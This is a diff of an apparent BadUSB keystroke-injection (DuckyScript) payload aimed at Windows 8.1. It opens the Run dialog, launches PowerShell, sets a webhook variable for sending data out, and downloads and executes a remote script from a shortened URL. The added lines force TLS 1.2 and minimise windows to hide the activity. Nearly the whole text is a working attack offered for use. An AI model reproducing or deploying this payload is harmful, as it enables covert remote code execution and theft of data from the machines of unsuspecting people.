@@ -8,9 +8,16 @@ REM │ actual webhook URL.                                │
 REM │ Target: WINDOWS 8.1                                │
 REM └────────────────────────────────────────────────────┘
 
-DELAY 500
+DELAY 300
 ESC
 GUI r
 DELAY 750
-STRING powershell -NoP -Ep Bypass -W H  $dc='WEBHOOK_LINK'; irm https://is.gd/jciHTz | iex
+STRING powershell 
+DELAY 300
+STRING $dc='WEBHOOK_LINK';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iex (New-Object Net.WebClient).DownloadString('https://is.gd/jciHTz')"
+DELAY 300
 ENTER
+DELAY 300
+WIN m
+DELAY 300
+ESC
